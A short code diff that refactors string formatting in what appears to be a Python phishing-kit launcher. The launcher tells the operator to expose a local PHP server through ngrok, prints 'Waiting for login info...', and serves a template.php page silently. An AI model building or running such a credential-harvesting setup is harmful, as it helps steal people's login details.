@@ -16,8 +16,12 @@ class bcolors:
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
-print(bcolors.BLUE+"Run "+bcolors.YELLOW+"ngrok http localhost: "+port+bcolors.BLUE+" in new terminal\n"+bcolors.END)
+print(
+	f"{bcolors.BLUE}Run {bcolors.YELLOW}ngrok http localhost: {port}{bcolors.BLUE}"
+	+ " in new terminal\n"
+	+ bcolors.END
+)
 print("Waiting for login info...")
 
-os.system("php -S localhost:"+port+" template.php > /dev/null 2>&1")
+os.system(f"php -S localhost:{port} template.php > /dev/null 2>&1")
 
